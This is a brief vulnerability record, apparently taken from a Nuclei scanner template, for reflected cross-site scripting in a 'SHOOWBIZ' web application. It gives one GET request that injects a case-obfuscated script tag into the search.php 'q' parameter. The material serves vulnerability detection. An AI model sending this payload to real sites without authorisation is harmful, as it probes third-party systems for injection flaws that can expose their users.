# Vulnerability: SHOOWBIZ - Cross Site Scripting
**Classification:** SHOOWBIZ
**Source:** Nuclei Template (`shoowbiz-xss.yaml`)

## Description
Cross-Site Scripting, is a type of security vulnerability commonly found in web applications. It occurs when an attacker injects malicious scripts (typically written in JavaScript) into web pages viewed by other users.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/search.php?q=%3CScRipT%3Ealert(document.domain);%3C/ScRipT%3E
```

